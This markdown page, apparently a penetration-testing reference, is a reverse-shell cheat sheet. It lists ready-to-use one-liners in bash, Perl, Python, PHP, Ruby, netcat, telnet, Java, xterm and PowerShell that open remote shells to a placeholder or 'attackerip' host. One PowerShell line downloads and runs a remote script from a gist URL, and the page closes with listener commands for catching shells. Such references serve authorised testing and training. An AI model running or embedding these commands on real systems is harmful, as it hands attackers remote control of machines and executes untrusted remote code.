---
layout: default
title: Reverse Shells
tags:
    - bash
    - java
    - netcat
    - nc
    - perl
    - php
    - python
    - ruby
    - telnet
    - xterm
---
# Reverse Shells

### Linux
**Bash**

```shell
bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
```

```shell
0<&196;exec 196<>/dev/tcp/[IP]/[PORT]; sh <&196 >&196 2>&19
```

```shell
exec 5<>/dev/tcp/[IP]/[PORT]
while read line 0<&5; do $line 2>&5 >&5; done
```

```shell
exec 5<>/dev/tcp/[IP]/[PORT]; cat <&5 | while read line; do $line 2>&5 >&5; done
```

```shell
sh -i >& /dev/udp/[IP]/[PORT] 0>&1
```
- UDP, use `-u` flag with nc for catching locally

**Perl**

```shell
perl -e 'use Socket;$i="[IP]";$p=[PORT];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```shell
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IP]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
- no `/bin/sh`

**Python**

```shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("[IP]",[PORT]));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP**

```shell
php -r '$sock=fsockopen("[IP]",[PORT]);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Ruby**

```shell
ruby -rsocket -e'f=TCPSocket.open("[IP]",[PORT]).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```shell
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
- no `/bin/sh`

**Netcat**

```shell
nc -e /bin/sh [IP] [PORT]
```

```shell
/bin/sh | nc [IP] [PORT]
```

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [IP] [PORT] >/tmp/f
```
- no `-e` flag

**Telnet**

```shell
rm -f /tmp/p; mknod /tmp/p p && telnet [IP] [PORT] 0/tmp/p
```

```shell
telnet [IP] [PORT1] | /bin/bash | telnet [IP] [PORT2]
```
- listen locally on [PORT2]

**Java**

```java
r = Runtime.getRuntime();
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/[IP]/[PORT];cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[]);
p.waitFor();
```

**xterm**

```shell
xterm -display [IP]:1
```
- Port 6001
- Locally, to catch the incoming session on port 6001 `Xnest :1`
- Locally, to authorise the target's connection `xhost +[TARGETIP]`

---

### Windows
**Perl**

```ps
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"[IP]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

**Powershell**

```ps
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("[IP]",[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```ps
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('[IP]',[PORT]);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

```ps
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
```
- [staged](https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1)

**Python**

```ps
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('[IP]', [PORT])), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
```

**Ruby**

```ps
ruby -rsocket -e 'c=TCPSocket.new("[IP]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
---

### Catching Shells
**Metasploit**

```shell
use exploit/multi/handler
```

**Netcat**

```shell
nc -lvnp [PORT]
```
- can use `-vv`/`-vvv` to debug with extra verbosity

### Useful links:
- <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet>
- <http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html>
- <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md>
